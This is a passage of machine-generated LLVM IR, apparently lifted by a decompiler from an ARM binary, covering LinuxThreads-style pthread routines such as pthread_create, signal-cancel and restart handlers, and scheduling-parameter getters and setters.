  uselistorder i32 (i32)* @close, { 12, 11, 1, 0, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 9, 8, 7, 6, 5, 16, 15, 14, 13, 10, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__clone, { 1, 0 }
  uselistorder label %dec_label_pc_1ffbc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1ffb8, { 1, 0 }
  uselistorder label %dec_label_pc_1ff7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1fee4, { 1, 0 }
  uselistorder label %dec_label_pc_1feb0, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_1ffd4(i64* %arg1) local_unnamed_addr {
dec_label_pc_1ffd4:
  %v0_1ffd4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1ffd4, label %.thread3, label %.thread13

.thread3:                                         ; preds = %dec_label_pc_1ffd4
  call void @llvm.trap()
  unreachable

.thread13:                                        ; preds = %dec_label_pc_1ffd4
  %tmp = ptrtoint i64* %arg1 to i32
  ret i32 %tmp
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_20010 = load i32, i32* @r4, align 4
  store i32 %v3_20010, i32* %stack_var_-32, align 4
  %v6_20010 = load i32, i32* @r5, align 4
  %v9_20010 = load i32, i32* @r6, align 4
  %v12_20010 = load i32, i32* @r7, align 4
  %v15_20010 = load i32, i32* @r8, align 4
  %v18_20010 = load i32, i32* @sb, align 4
  %v21_20010 = load i32, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v4_20020 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 132) to i32*), align 4
  %v1_20024 = inttoptr i32 %v4_20020 to i32*
  %v2_20024 = load i32, i32* %v1_20024, align 4
  %v1_20028 = icmp slt i32 %v2_20024, 0
  store i32 %tmp, i32* @sb, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v1_20028, label %dec_label_pc_20044, label %dec_label_pc_20054

dec_label_pc_20044:                               ; preds = %entry
  %v0_20044 = call i32 @__pthread_initialize_manager()
  store i32 %v0_20044, i32* %r0.global-to-local, align 4
  %v1_20048 = icmp slt i32 %v0_20044, 0
  br i1 %v1_20048, label %.thread8, label %dec_label_pc_20054

.thread8:                                         ; preds = %dec_label_pc_20044
  store i32 11, i32* %r0.global-to-local, align 4
  br label %bb25

dec_label_pc_20054:                               ; preds = %dec_label_pc_20044, %entry
  %v0_20054 = call i32 @_thread_self.3()
  %v2_2005c = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_2005c, i32* @r4, align 4
  store i32 %v0_20054, i32* @r5, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_2006c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_20054, i32* %stack_var_-60, align 4
  %v3_20084 = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_2006c)
  store i32 %v3_20084, i32* %r0.global-to-local, align 4
  %v0_2008c = load i32, i32* @r6, align 4
  %v2_2008c = add i32 %v0_2008c, 132
  %v3_2008c = inttoptr i32 %v2_2008c to i32*
  %v4_2008c = load i32, i32* %v3_2008c, align 4
  store i32 %v4_2008c, i32* @r6, align 4
  br label %dec_label_pc_20090

dec_label_pc_20090:                               ; preds = %dec_label_pc_200a8.dec_label_pc_20090_crit_edge, %dec_label_pc_20054
  %v0_20098 = phi i32 [ %v0_20098.pre, %dec_label_pc_200a8.dec_label_pc_20090_crit_edge ], [ %v4_2008c, %dec_label_pc_20054 ]
  %v1_20098 = inttoptr i32 %v0_20098 to i32*
  %v2_20098 = load i32, i32* %v1_20098, align 4
  store i32 %v2_20098, i32* %r0.global-to-local, align 4
  %v3_2009c = call i32 @write(i32 %v2_20098, i32 %v2_2005c, i32 28)
  store i32 %v3_2009c, i32* %r0.global-to-local, align 4
  %v3_200a0 = icmp eq i32 %v3_2009c, -1
  br i1 %v3_200a0, label %dec_label_pc_200a8, label %dec_label_pc_200b8

dec_label_pc_200a8:                               ; preds = %dec_label_pc_20090
  %v0_200a8 = call i32 @__errno_location()
  store i32 %v0_200a8, i32* %r0.global-to-local, align 4
  %v1_200ac = inttoptr i32 %v0_200a8 to i32*
  %v2_200ac = load i32, i32* %v1_200ac, align 4
  %v7_200b0 = icmp eq i32 %v2_200ac, 4
  br i1 %v7_200b0, label %dec_label_pc_200a8.dec_label_pc_20090_crit_edge, label %dec_label_pc_200b8

dec_label_pc_200a8.dec_label_pc_20090_crit_edge:  ; preds = %dec_label_pc_200a8
  %v0_20098.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_20090

dec_label_pc_200b8:                               ; preds = %dec_label_pc_20090, %dec_label_pc_200a8
  %v0_200b8 = load i32, i32* @r5, align 4
  store i32 %v0_200b8, i32* @r0, align 4
  %v1_200bc = call i32 @_suspend.4(i32 %v0_200b8)
  store i32 %v1_200bc, i32* %r0.global-to-local, align 4
  %v0_200c0 = load i32, i32* @r5, align 4
  %v1_200c0 = add i32 %v0_200c0, 52
  %v2_200c0 = inttoptr i32 %v1_200c0 to i32*
  %v3_200c0 = load i32, i32* %v2_200c0, align 4
  %v2_200c4 = icmp eq i32 %v3_200c0, 0
  br i1 %v2_200c4, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_200b8
  %v3_200cc4 = load i32, i32* %v2_200c0, align 4
  store i32 %v3_200cc4, i32* %r0.global-to-local, align 4
  br label %bb25

bb:                                               ; preds = %dec_label_pc_200b8
  %v2_200c8 = add i32 %v0_200c0, 48
  %v3_200c8 = inttoptr i32 %v2_200c8 to i32*
  %v4_200c8 = load i32, i32* %v3_200c8, align 4
  %v3_200cc = load i32, i32* %v2_200c0, align 4
  store i32 %v3_200cc, i32* %r0.global-to-local, align 4
  %v2_200d0 = load i32, i32* @sb, align 4
  %v3_200d0 = inttoptr i32 %v2_200d0 to i32*
  store i32 %v4_200c8, i32* %v3_200d0, align 4
  %v1_200dc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.thread8, %.thread, %bb
  %v1_200dc = phi i32 [ %v3_200cc4, %.thread ], [ %v1_200dc.pre, %bb ], [ 11, %.thread8 ]
  %v2_200d8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_200d8, i32* @r4, align 4
  store i32 %v6_20010, i32* @r5, align 4
  store i32 %v9_20010, i32* @r6, align 4
  store i32 %v12_20010, i32* @r7, align 4
  store i32 %v15_20010, i32* @r8, align 4
  store i32 %v18_20010, i32* @sb, align 4
  store i32 %v21_20010, i32* @sl, align 4
  ret i32 %v1_200dc

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 7, 6, 10, 8, 9, 11, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 132) to i32*), { 1, 2, 3, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %dec_label_pc_200b8, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v0_200e8 = call i32 @pthread_initialize()
  ret i32 %v0_200e8
}

define i32 @pthread_handle_sigcancel(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_200f8 = call i32 @_thread_self.3()
  store i32 %v0_200f8, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  %v4_20108 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120) to i32*), align 4
  store i32 %v4_20108, i32* %r2.global-to-local, align 4
  %v9_2010c = icmp eq i32 %v0_200f8, %v4_20108
  br i1 %v9_2010c, label %dec_label_pc_20114, label %dec_label_pc_20120

dec_label_pc_20114:                               ; preds = %entry
  %v0_20114 = load i32, i32* @r5, align 4
  store i32 %v0_20114, i32* %r0.global-to-local, align 4
  %v1_20118 = call i32 @__pthread_manager_sighandler(i32 %v0_20114)
  store i32 %v1_20118, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_201a8

dec_label_pc_20120:                               ; preds = %entry
  store i32 200, i32* %r3.global-to-local, align 4
  %v4_20124 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 200) to i32*), align 4
  store i32 %v4_20124, i32* %r3.global-to-local, align 4
  %v1_20128 = inttoptr i32 %v4_20124 to i32*
  %v2_20128 = load i32, i32* %v1_20128, align 4
  store i32 %v2_20128, i32* %r3.global-to-local, align 4
  %v2_2012c = icmp eq i32 %v2_20128, 0
  br i1 %v2_2012c, label %dec_label_pc_20164, label %dec_label_pc_20134

dec_label_pc_20134:                               ; preds = %dec_label_pc_20120
  store i32 260, i32* %r3.global-to-local, align 4
  %v4_20138 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 260) to i32*), align 4
  store i32 %v4_20138, i32* %r3.global-to-local, align 4
  %v1_2013c = inttoptr i32 %v4_20138 to i32*
  %v2_2013c = load i32, i32* %v1_2013c, align 4
  store i32 %v2_2013c, i32* %r3.global-to-local, align 4
  %v9_20140 = icmp eq i32 %v0_200f8, %v2_2013c
  br i1 %v9_20140, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_20134
  %v2_20144 = add i32 %v4_20108, 20
  %v3_20144 = inttoptr i32 %v2_20144 to i32*
  %v4_20144 = load i32, i32* %v3_20144, align 4
  store i32 %v4_20144, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_20134, %bb
  call void @__pseudo_cond_branch(i1 %v9_20140, i32 ptrtoint (i32* @global_var_1efd8.1417 to i32))
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_20158 = load i32, i32* @r4, align 4
  %v2_20158 = add i32 %v0_20158, 20
  %v3_20158 = inttoptr i32 %v2_20158 to i32*
  %v4_20158 = load i32, i32* %v3_20158, align 4
  store i32 %v4_20158, i32* %r3.global-to-local, align 4
  %v1_2015c = inttoptr i32 %v4_20158 to i32*
  %v2_2015c = load i32, i32* %v1_2015c, align 4
  store i32 %v2_2015c, i32* %r0.global-to-local, align 4
  %v1_20160 = call i32 @__GI__exit(i32 %v2_2015c)
  store i32 %v1_20160, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_20164

dec_label_pc_20164:                               ; preds = %dec_label_pc_20120, %.thread1
  %v0_2017c = phi i32 [ %v0_200f8, %dec_label_pc_20120 ], [ %v1_20160, %.thread1 ]
  %v1_20164 = add i32 %v0_2017c, 66
  %v2_20164 = inttoptr i32 %v1_20164 to i8*
  %v3_20164 = load i8, i8* %v2_20164, align 1
  %v4_20164 = zext i8 %v3_20164 to i32
  store i32 %v4_20164, i32* %r3.global-to-local, align 4
  %v2_20168 = icmp eq i8 %v3_20164, 0
  br i1 %v2_20168, label %dec_label_pc_201a8, label %dec_label_pc_20170

dec_label_pc_20170:                               ; preds = %dec_label_pc_20164
  %v1_20170 = add i32 %v0_2017c, 64
  %v2_20170 = inttoptr i32 %v1_20170 to i8*
  %v3_20170 = load i8, i8* %v2_20170, align 1
  %v4_20170 = zext i8 %v3_20170 to i32
  store i32 %v4_20170, i32* %r2.global-to-local, align 4
  %v2_20174 = icmp eq i8 %v3_20170, 0
  br i1 %v2_20174, label %dec_label_pc_2017c, label %dec_label_pc_201a8

dec_label_pc_2017c:                               ; preds = %dec_label_pc_20170
  %v1_2017c = add i32 %v0_2017c, 65
  %v2_2017c = inttoptr i32 %v1_2017c to i8*
  %v3_2017c = load i8, i8* %v2_2017c, align 1
  %v4_2017c = zext i8 %v3_2017c to i32
  store i32 %v4_2017c, i32* %r3.global-to-local, align 4
  %v7_20180 = icmp eq i8 %v3_2017c, 1
  br i1 %v7_20180, label %bb11, label %.thread2

bb11:                                             ; preds = %dec_label_pc_2017c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2017c, %bb11
  call void @__pseudo_cond_branch(i1 %v7_20180, i32 ptrtoint (i32* @global_var_21250.1419 to i32))
  %v0_20190 = load i32, i32* %r0.global-to-local, align 4
  %v1_20190 = add i32 %v0_20190, 40
  %v2_20190 = inttoptr i32 %v1_20190 to i32*
  %v3_20190 = load i32, i32* %v2_20190, align 4
  store i32 %v3_20190, i32* %r3.global-to-local, align 4
  %v2_20194 = icmp eq i32 %v3_20190, 0
  br i1 %v2_20194, label %.thread4, label %bb12

bb12:                                             ; preds = %.thread2
  %v1_20198 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_20198, i32* %v2_20190, align 4
  %v1_201a0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_201a0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb12
  %v1_201a4 = xor i1 %v2_20194, true
  call void @__pseudo_cond_branch(i1 %v1_201a4, i32 ptrtoint (i32* @global_var_22054.1420 to i32))
  %v1_201b0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_201a8

dec_label_pc_201a8:                               ; preds = %dec_label_pc_20170, %dec_label_pc_20164, %dec_label_pc_20114, %.thread4
  %v1_201b0 = phi i32 [ %v0_2017c, %dec_label_pc_20170 ], [ %v0_2017c, %dec_label_pc_20164 ], [ %v1_20118, %dec_label_pc_20114 ], [ %v1_201b0.pre, %.thread4 ]
  ret i32 %v1_201b0

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 8, 2, 5, 3, 4, 7, 6, 10, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120) to i32*), { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_201a8, { 3, 0, 1, 2 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_20164, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_201b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_201b8:
  %v0_201b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_201b8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_201b8
  %v2_201b8 = load i32, i32* @r8, align 4
  %v4_201b8 = lshr i32 %v2_201b8, %arg1
  %v5_201b8 = sub i32 32, %arg1
  %v6_201b8 = shl i32 %v2_201b8, %v5_201b8
  %v7_201b8 = or i32 %v6_201b8, %v4_201b8
  %v5_201bc = sdiv i32 %v2_201b8, 2
  %v2_201c0 = load i32, i32* @r4, align 4
  %v5_201c0 = mul i32 %v2_201c0, 4
  %v9_201b8 = and i32 %v5_201bc, %arg1
  %v6_201bc = and i32 %v9_201b8, %v7_201b8
  %v6_201c0 = and i32 %v6_201bc, %v5_201c0
  %v8_201c4 = shl i32 %v2_201c0, %v6_201c0
  %v9_201c4 = and i32 %v8_201c4, %v6_201c0
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_201b8, %bb
  %v10_201c4 = phi i32 [ %arg1, %dec_label_pc_201b8 ], [ %v9_201c4, %bb ]
  ret i32 %v10_201c4

; uselistorder directives
  uselistorder i32 %v2_201c0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_201c8 = load i32, i32* @r4, align 4
  store i32 %v3_201c8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v0_201d0 = call i32 @_thread_self.3()
  store i32 %v0_201d0, i32* %r0.global-to-local, align 4
  %v1_201d4 = add i32 %v0_201d0, 36
  %v2_201d4 = inttoptr i32 %v1_201d4 to i32*
  %v3_201d4 = load i32, i32* %v2_201d4, align 4
  store i32 %v3_201d4, i32* %r3.global-to-local, align 4
  %v2_201d8 = icmp eq i32 %v3_201d4, 0
  %v0_201dc = load i32, i32* %r4.global-to-local, align 4
  %v2_201dc = add i32 %v0_201d0, 32
  %v3_201dc = inttoptr i32 %v2_201dc to i32*
  store i32 %v0_201dc, i32* %v3_201dc, align 4
  br i1 %v2_201d8, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v1_201e0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_201e0, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_201e8 = xor i1 %v2_201d8, true
  call void @__pseudo_cond_branch(i1 %v1_201e8, i32 ptrtoint (i32* @global_var_22054.1420 to i32))
  %v2_201ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_201ec, i32* %r4.global-to-local, align 4
  %v1_201f0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_201f0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 ()* @_thread_self.3, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_initialize_minimal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_20200 = call i32 @__libc_pthread_init(i32 0)
  store i32 %v1_20200, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38684) to i32*), align 4
  ret i32 %v1_20200

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38684) to i32*), { 1, 0 }
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_20228 = load i32, i32* @r4, align 4
  store i32 %v3_20228, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @sl, align 4
  store i32 %arg1, i32* @r7, align 4
  %v4_2023c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 84) to i32*), align 4
  %v3_20244 = urem i32 %arg1, 1024
  %v4_20248 = mul nuw nsw i32 %v3_20244, 16
  %v5_20248 = add i32 %v4_2023c, %v4_20248
  store i32 %v5_20248, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v5_20248, i32* @r0, align 4
  store i32 %tmp, i32* @r8, align 4
  %v0_20260 = call i32 @__pthread_lock()
  %v0_20264 = load i32, i32* @r5, align 4
  %v1_20264 = add i32 %v0_20264, 8
  %v2_20264 = inttoptr i32 %v1_20264 to i32*
  %v3_20264 = load i32, i32* %v2_20264, align 4
  store i32 %v3_20264, i32* %r4.global-to-local, align 4
  %v2_20268 = icmp eq i32 %v3_20264, 0
  br i1 %v2_20268, label %dec_label_pc_2027c, label %dec_label_pc_20270

dec_label_pc_20270:                               ; preds = %entry
  %v1_20270 = add i32 %v3_20264, 16
  %v2_20270 = inttoptr i32 %v1_20270 to i32*
  %v3_20270 = load i32, i32* %v2_20270, align 4
  %v1_20274 = load i32, i32* @r7, align 4
  %v9_20274 = icmp eq i32 %v3_20270, %v1_20274
  br i1 %v9_20274, label %dec_label_pc_202d8, label %dec_label_pc_2027c

dec_label_pc_2027c:                               ; preds = %dec_label_pc_20270, %entry
  %v1_20280 = call i32 @__pthread_unlock(i32 %v0_20264)
  br label %dec_label_pc_202f4

dec_label_pc_202a0:                               ; preds = %dec_label_pc_202d8
  %v0_202a0 = load i32, i32* @r6, align 4
  %v2_202a0 = icmp eq i32 %v0_202a0, 0
  br i1 %v2_202a0, label %bb12, label %bb

bb:                                               ; preds = %dec_label_pc_202a0
  %v1_202a4 = load i32, i32* @r8, align 4
  %v2_202a4 = inttoptr i32 %v1_202a4 to i32*
  %v3_202a4 = load i32, i32* %v2_202a4, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_202a0, %bb
  %storemerge = phi i32 [ %v3_202a4, %bb ], [ 0, %dec_label_pc_202a0 ]
  %v1_202ac = load i32, i32* %r4.global-to-local, align 4
  %v2_202ac = add i32 %v1_202ac, 24
  %v3_202ac = inttoptr i32 %v2_202ac to i32*
  store i32 %storemerge, i32* %v3_202ac, align 4
  %v0_202b0 = load i32, i32* @r5, align 4
  %v1_202b4 = call i32 @__pthread_unlock(i32 %v0_202b0)
  %v0_202bc = load i32, i32* @sl, align 4
  %v2_202bc = add i32 %v0_202bc, 132
  %v3_202bc = inttoptr i32 %v2_202bc to i32*
  %v4_202bc = load i32, i32* %v3_202bc, align 4
  %v1_202c0 = inttoptr i32 %v4_202bc to i32*
  %v2_202c0 = load i32, i32* %v1_202c0, align 4
  %v1_202c4 = icmp slt i32 %v2_202c0, 0
  br i1 %v1_202c4, label %bb14, label %bb13

bb13:                                             ; preds = %bb12
  br label %bb14

bb14:                                             ; preds = %bb12, %bb13
  %v3_202cc = xor i1 %v1_202c4, true
  call void @__pseudo_cond_branch(i1 %v3_202cc, i32 ptrtoint (i32* @global_var_1c974.1426 to i32))
  br label %dec_label_pc_202f4

dec_label_pc_202d8:                               ; preds = %dec_label_pc_20270
  %v1_202d8 = add i32 %v3_20264, 20
  %v2_202d8 = inttoptr i32 %v1_202d8 to i32*
  %v3_202d8 = load i32, i32* %v2_202d8, align 4
  %v0_202dc = load i32, i32* @r6, align 4
  %v0_202e0 = load i32, i32* @r8, align 4
  %v3_202e4 = call i32 @sched_setscheduler(i32 %v3_202d8, i32 %v0_202dc, i32 %v0_202e0)
  %v3_202e8 = icmp eq i32 %v3_202e4, -1
  br i1 %v3_202e8, label %dec_label_pc_202f0, label %dec_label_pc_202a0

dec_label_pc_202f0:                               ; preds = %dec_label_pc_202d8
  %v0_2028c = load i32, i32* @r5, align 4
  %v1_20290 = call i32 @__pthread_unlock(i32 %v0_2028c)
  %v0_20294 = call i32 @__errno_location()
  %v1_20298 = inttoptr i32 %v0_20294 to i32*
  %v2_20298 = load i32, i32* %v1_20298, align 4
  br label %dec_label_pc_202f4

dec_label_pc_202f4:                               ; preds = %dec_label_pc_202f0, %bb14, %dec_label_pc_2027c
  %v1_202fc = phi i32 [ %v2_20298, %dec_label_pc_202f0 ], [ 0, %bb14 ], [ 3, %dec_label_pc_2027c ]
  %v2_202f8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_202f8, i32* %r4.global-to-local, align 4
  ret i32 %v1_202fc

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @sched_setscheduler, { 1, 2, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @function_20304(i32 %arg1) local_unnamed_addr {
dec_label_pc_20304:
  %v0_20304 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_20304, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_20304
  %v2_20304 = load i32, i32* @r4, align 4
  %v8_20304 = ashr i32 %v2_20304, %arg1
  %v9_20304 = and i32 %v8_20304, %arg1
  %v4_20308 = mul i32 %v2_20304, 2
  %v5_20308 = and i32 %v9_20304, %v4_20308
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_20304, %bb
  %v6_20308 = phi i32 [ %arg1, %dec_label_pc_20304 ], [ %v5_20308, %bb ]
  ret i32 %v6_20308

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_20310 = load i32, i32* @r4, align 4
  store i32 %v3_20310, i32* %stack_var_-20, align 4
  %v6_20310 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 84, i32* %r0.global-to-local, align 4
  %v4_20320 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 84) to i32*), align 4
  %v3_20328 = urem i32 %arg1, 1024
  %v4_2032c = mul nuw nsw i32 %v3_20328, 16
  %v5_2032c = add i32 %v4_20320, %v4_2032c
  store i32 %v5_2032c, i32* @r4, align 4
  store i32 %v5_2032c, i32* @r0, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  %v0_20344 = call i32 @__pthread_lock()
  store i32 %v0_20344, i32* %r0.global-to-local, align 4
  %v0_20348 = load i32, i32* @r4, align 4
  %v1_20348 = add i32 %v0_20348, 8
  %v2_20348 = inttoptr i32 %v1_20348 to i32*
  %v3_20348 = load i32, i32* %v2_20348, align 4
  store i32 %v3_20348, i32* %r0.global-to-local, align 4
  %v2_2034c = icmp eq i32 %v3_20348, 0
  br i1 %v2_2034c, label %dec_label_pc_20360, label %dec_label_pc_20354

dec_label_pc_20354:                               ; preds = %entry
  %v1_20354 = add i32 %v3_20348, 16
  %v2_20354 = inttoptr i32 %v1_20354 to i32*
  %v3_20354 = load i32, i32* %v2_20354, align 4
  %v1_20358 = load i32, i32* @r5, align 4
  %v9_20358 = icmp eq i32 %v3_20354, %v1_20358
  br i1 %v9_20358, label %dec_label_pc_20398, label %dec_label_pc_20360

dec_label_pc_20360:                               ; preds = %dec_label_pc_20354, %entry
  store i32 %v0_20348, i32* %r0.global-to-local, align 4
  %v1_20364 = call i32 @__pthread_unlock(i32 %v0_20348)
  store i32 3, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_203bc

dec_label_pc_20370:                               ; preds = %dec_label_pc_20398
  %v0_20370 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_20370, i32* %r0.global-to-local, align 4
  %v0_20374 = load i32, i32* @r6, align 4
  %v2_20378 = call i32 @sched_getparam(i32 %v0_20370, i32 %v0_20374)
  store i32 %v2_20378, i32* %r0.global-to-local, align 4
  %v3_2037c = icmp eq i32 %v2_20378, -1
  %v8_2037c = icmp eq i32 %v2_20378, -1
  br i1 %v8_2037c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_20370
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_20384 = load i32, i32* %r4.global-to-local, align 4
  %v2_20384 = load i32, i32* @r7, align 4
  %v3_20384 = inttoptr i32 %v2_20384 to i32*
  store i32 %v1_20384, i32* %v3_20384, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_20370, %bb
  br i1 %v3_2037c, label %dec_label_pc_2038c, label %.thread.dec_label_pc_203bc_crit_edge

.thread.dec_label_pc_203bc_crit_edge:             ; preds = %.thread
  %v1_203c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_203bc

dec_label_pc_2038c:                               ; preds = %dec_label_pc_20398, %.thread
  %v0_2038c = call i32 @__errno_location()
  store i32 %v0_2038c, i32* %r0.global-to-local, align 4
  %v1_20390 = inttoptr i32 %v0_2038c to i32*
  %v2_20390 = load i32, i32* %v1_20390, align 4
  store i32 %v2_20390, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_203bc

dec_label_pc_20398:                               ; preds = %dec_label_pc_20354
  %v1_20398 = add i32 %v3_20348, 20
  %v2_20398 = inttoptr i32 %v1_20398 to i32*
  %v3_20398 = load i32, i32* %v2_20398, align 4
  store i32 %v3_20398, i32* %r5.global-to-local, align 4
  store i32 %v0_20348, i32* %r0.global-to-local, align 4
  %v1_203a0 = call i32 @__pthread_unlock(i32 %v0_20348)
  store i32 %v3_20398, i32* %r0.global-to-local, align 4
  %v1_203a8 = call i32 @sched_getscheduler(i32 %v3_20398)
  store i32 %v1_203a8, i32* %r0.global-to-local, align 4
  %v3_203ac = icmp eq i32 %v1_203a8, -1
  store i32 %v1_203a8, i32* %r4.global-to-local, align 4
  br i1 %v3_203ac, label %dec_label_pc_2038c, label %dec_label_pc_20370

dec_label_pc_203bc:                               ; preds = %.thread.dec_label_pc_203bc_crit_edge, %dec_label_pc_2038c, %dec_label_pc_20360
  %v1_203c4 = phi i32 [ %v1_203c4.pre, %.thread.dec_label_pc_203bc_crit_edge ], [ %v2_20390, %dec_label_pc_2038c ], [ 3, %dec_label_pc_20360 ]
  %v2_203c0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_203c0, i32* %r4.global-to-local, align 4
  store i32 %v6_20310, i32* %r5.global-to-local, align 4
  ret i32 %v1_203c4

; uselistorder directives
  uselistorder i32 %v3_20398, { 1, 0, 2 }
  uselistorder i32 %v0_20348, { 3, 2, 1, 0, 4 }
